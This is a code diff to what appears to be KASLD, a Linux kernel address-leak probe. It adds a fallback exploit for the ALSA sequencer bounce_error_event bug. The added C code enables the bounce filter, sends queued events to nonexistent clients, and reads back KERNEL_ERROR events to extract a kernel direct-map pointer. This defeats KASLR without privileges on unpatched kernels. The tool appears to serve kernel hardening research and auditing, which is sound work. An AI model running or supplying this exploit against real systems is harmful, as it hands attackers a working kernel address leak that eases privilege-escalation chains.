@@ -19,6 +19,15 @@
 // The fix adds a single line, `tmpev.data.ext.ptr = NULL;`, before the
 // copy_to_user() in snd_seq_read().
 //
+// When that primary path reads back NULL (its fix is applied), a fallback tries
+// a separate sibling leak in the same subsystem, bounce_error_event (commit
+// efc86691e4d8), whose fix is independently backportable and so can still be
+// live: pre-fix, a failed delivery bounced a fixed-length KERNEL_ERROR event
+// back to the sender carrying data.quote.event — a pool-cell pointer at the
+// same offset (20) as data.ext.ptr. It is triggered by enabling
+// SNDRV_SEQ_FILTER_ BOUNCE and queueing an event to a nonexistent destination,
+// and yields the same direct-map / page_offset quantity.
+//
 //   Data leaked:      a struct snd_seq_event_cell * (kvmalloc pool cell,
 //                     direct-map VA)
 //   Kernel subsystem: sound/core/seq — snd_seq_read() variable-event header
@@ -63,6 +72,7 @@
 
 #include <errno.h>
 #include <fcntl.h>
+#include <poll.h>
 #include <stddef.h> /* offsetof */
 #include <stdint.h>
 #include <string.h>
@@ -144,6 +154,24 @@ _Static_assert(offsetof(kasld_seq_event, data.ext.len) == 16,
 #define KASLD_SEQ_PORT_CAP_RW 0x63 /* READ|WRITE|SUBS_READ|SUBS_WRITE */
 #define KASLD_SEQ_PORT_TYPE_APPLICATION 0x100000
 
+/* Fallback path ABI — the bounce_error_event leak (commit efc86691e4d8), a
+ * distinct seq-cluster fix from the primary data.ext.ptr one (705dd6dcbc0e).
+ * struct snd_seq_client_info (188 B) and snd_seq_queue_info (140 B) are both
+ * pointer-free, so their ioctl request numbers are arch-stable and used
+ * directly; only fixed-offset fields are touched via raw buffers.
+ *   _IOWR('S',0x10, client_info) / _IOW('S',0x11, client_info) /
+ *   _IOWR('S',0x32, queue_info) */
+#define KASLD_SEQ_IOCTL_GET_CLIENT_INFO 0xc0bc5310UL
+#define KASLD_SEQ_IOCTL_SET_CLIENT_INFO 0x40bc5311UL
+#define KASLD_SEQ_IOCTL_CREATE_QUEUE 0xc08c5332UL
+#define KASLD_SEQ_CLIENT_INFO_SZ 188
+#define KASLD_SEQ_CLIENT_INFO_FILTER_OFF 72 /* u32 filter field */
+#define KASLD_SEQ_QUEUE_INFO_SZ 140         /* int queue id at offset 0 */
+#define KASLD_SEQ_FILTER_BOUNCE 0x4
+#define KASLD_SEQ_EVENT_NOTEON 6
+#define KASLD_SEQ_EVENT_START 30
+#define KASLD_SEQ_EVENT_KERNEL_ERROR 150
+
 #define SEQ_DEVICE "/dev/snd/seq"
 
 /* Upper bound on concurrently-held sequencer clients used to sample the direct
@@ -166,14 +194,18 @@ KASLD_EXPLAIN(
     "sequencer event addressed to itself via direct dispatch, then reads it "
     "back. Before commit 705dd6dcbc0e, snd_seq_read() returned the event "
     "header with data.ext.ptr still pointing at the kvmalloc'd pool cell that "
-    "holds the chained payload — a kernel direct-map address that bounds the "
-    "direct-map base. Holds many clients open at once so their pools land at "
+    "holds the chained payload — a kernel direct-map address that bounds "
+    "the direct-map base. Holds many clients open at once so their pools land "
+    "at "
     "different direct-map addresses, and emits the lowest (tightest "
-    "page_offset "
-    "ceiling) and highest (interior floor witness). Unprivileged via the "
-    "/dev/snd/seq device ACL and independent of kptr_restrict (raw "
-    "copy_to_user, not %pK). Emits only when a real kernel pointer returns, so "
-    "it is a silent no-op on a patched kernel (data.ext.ptr cleared to NULL).");
+    "page_offset ceiling) and highest (interior floor witness). Unprivileged "
+    "via"
+    "the /dev/snd/seq device ACL and independent of kptr_restrict (raw "
+    "copy_to_user, not %pK). If that path is patched, falls back to the "
+    "bounce_error_event leak (commit efc86691e4d8): a delivery error bounces a "
+    "KERNEL_ERROR event back carrying the same kind of pool-cell pointer. "
+    "Emits only when a real kernel pointer returns, so it is a silent no-op on "
+    "a fully patched kernel.");
 
 KASLD_META("method:parsed\n"
            "phase:inference\n"
@@ -240,6 +272,100 @@ static int seq_leak_on_fd(int fd, unsigned long *out) {
   return 0;
 }
 
+/* Fallback leak via bounce_error_event (commit efc86691e4d8) — an independently
+ * backportable sibling of the primary fix, so it can be live when the primary
+ * is patched. Pre-fix, a delivery error bounced a fixed-length KERNEL_ERROR
+ * event back to the sender with data.quote.event = a pool-cell pointer, at the
+ * same offset (20) as data.ext.ptr. Trigger: enable SNDRV_SEQ_FILTER_BOUNCE,
+ * then queue an event (non-direct, so it is eligible to bounce) to a
+ * nonexistent destination client; delivery fails and the bounce lands in this
+ * client's own input FIFO. Stores the pointer in *out (0 if none). Yields the
+ * same direct-map / page_offset quantity as the primary path. */
+static int seq_leak_bounce(int fd, unsigned long *out) {
+  *out = 0;
+
+  int myclient = -1;
+  if (seq_ioctl(fd, KASLD_SEQ_IOCTL_CLIENT_ID, &myclient) < 0 || myclient < 0)
+    return -1;
+
+  kasld_seq_port_info pinfo;
+  memset(&pinfo, 0, sizeof(pinfo));
+  pinfo.addr.client = (unsigned char)myclient;
+  strncpy(pinfo.name, "kasld", sizeof(pinfo.name) - 1);
+  pinfo.capability = KASLD_SEQ_PORT_CAP_RW;
+  pinfo.type = KASLD_SEQ_PORT_TYPE_APPLICATION;
+  if (seq_ioctl(fd, KASLD_SEQ_IOCTL_CREATE_PORT, &pinfo) < 0)
+    return -1;
+  unsigned char myport = pinfo.addr.port;
+
+  /* Enable the bounce filter: read the client info, set the filter bit, write
+   * it back (raw buffer at the known filter offset). */
+  unsigned char ci[KASLD_SEQ_CLIENT_INFO_SZ];
+  memset(ci, 0, sizeof(ci));
+  memcpy(ci, &myclient, sizeof(int)); /* client id at offset 0 */
+  seq_ioctl(fd, KASLD_SEQ_IOCTL_GET_CLIENT_INFO, ci);
+  uint32_t filt;
+  memcpy(&filt, ci + KASLD_SEQ_CLIENT_INFO_FILTER_OFF, sizeof(filt));
+  filt |= KASLD_SEQ_FILTER_BOUNCE;
+  memcpy(ci + KASLD_SEQ_CLIENT_INFO_FILTER_OFF, &filt, sizeof(filt));
+  if (seq_ioctl(fd, KASLD_SEQ_IOCTL_SET_CLIENT_INFO, ci) < 0)
+    return -1;
+
+  /* Create and start a queue so a scheduled event is actually delivered. */
+  unsigned char qi[KASLD_SEQ_QUEUE_INFO_SZ];
+  memset(qi, 0, sizeof(qi));
+  if (seq_ioctl(fd, KASLD_SEQ_IOCTL_CREATE_QUEUE, qi) < 0)
+    return -1;
+  int q;
+  memcpy(&q, qi, sizeof(q)); /* queue id at offset 0 */
+
+  kasld_seq_event ev;
+  memset(&ev, 0, sizeof(ev));
+  ev.type = KASLD_SEQ_EVENT_START;
+  ev.queue = KASLD_SEQ_QUEUE_DIRECT;
+  ev.dest.client = 0;                 /* SNDRV_SEQ_CLIENT_SYSTEM */
+  ev.dest.port = 0;                   /* SNDRV_SEQ_PORT_SYSTEM_TIMER */
+  ev.data.raw8[0] = (unsigned char)q; /* data.queue.queue at event offset 16 */
+  if (write(fd, &ev, sizeof(ev)) != (ssize_t)sizeof(ev))
+    return -1;
+
+  /* Schedule events on the queue (tick 0 => immediate) to nonexistent clients;
+   * delivery fails and each bounces back. */
+  for (int bad = 250; bad >= 240; bad--) {
+    memset(&ev, 0, sizeof(ev));
+    ev.type = KASLD_SEQ_EVENT_NOTEON;
+    ev.flags = 0; /* SNDRV_SEQ_TIME_STAMP_TICK | SNDRV_SEQ_TIME_MODE_ABS */
+    ev.queue = (unsigned char)q;
+    ev.source.client = (unsigned char)myclient;
+    ev.source.port = myport;
+    ev.dest.client = (unsigned char)bad;
+    ev.dest.port = 0;
+    if (write(fd, &ev, sizeof(ev)) < 0)
+      break;
+  }
+
+  /* Read back; a KERNEL_ERROR bounce carries the quoted pointer at offset 20,
+   * i.e. the data.ext.ptr member. */
+  for (int tries = 0; tries < 20; tries++) {
+    struct pollfd p = {fd, POLLIN, 0};
+    if (poll(&p, 1, 100) <= 0)
+      continue;
+    unsigned char rbuf[512];
+    ssize_t r = read(fd, rbuf, sizeof(rbuf));
+    if (r < (ssize_t)sizeof(kasld_seq_event))
+      continue;
+    for (ssize_t o = 0; o + (ssize_t)sizeof(kasld_seq_event) <= r;
+         o += (ssize_t)sizeof(kasld_seq_event)) {
+      kasld_seq_event *rev = (kasld_seq_event *)(rbuf + o);
+      if (rev->type == KASLD_SEQ_EVENT_KERNEL_ERROR) {
+        *out = (unsigned long)(uintptr_t)rev->data.ext.ptr;
+        return 0;
+      }
+    }
+  }
+  return 0;
+}
+
 int main(int argc, char **argv) {
   kasld_cli(argc, argv);
   /* Live host probe: drives the running kernel's sequencer; the leaked address
@@ -283,9 +409,21 @@ int main(int argc, char **argv) {
     return KASLD_EXIT_UNAVAILABLE;
   }
   if (addr == 0) {
-    /* The fix unconditionally NULLs data.ext.ptr, so one NULL round trip is a
-     * definitive patched verdict — no need to open the batch. */
-    kasld_err("data.ext.ptr came back NULL (patched: commit 705dd6dcbc0e)");
+    /* Primary path patched (data.ext.ptr NULLed by 705dd6dcbc0e). Try the
+     * bounce_error_event fallback (efc86691e4d8) — a separately backportable
+     * sibling that can still be live — before concluding patched. */
+    unsigned long baddr = 0;
+    seq_leak_bounce(fd0, &baddr);
+    if (baddr && kasld_addr_is_directmap(baddr)) {
+      kasld_found("leaked direct-map pointer via seq bounce_error_event: 0x%lx",
+                  baddr);
+      kasld_result_sample(KASLD_TYPE_VIRT, REGION_DIRECTMAP, baddr, NULL,
+                          CONF_PARSED);
+      close(fd0);
+      return 0;
+    }
+    kasld_err("data.ext.ptr NULL and no bounce leak (patched: 705dd6dcbc0e"
+              " + efc86691e4d8)");
     close(fd0);
     return 0;
   }
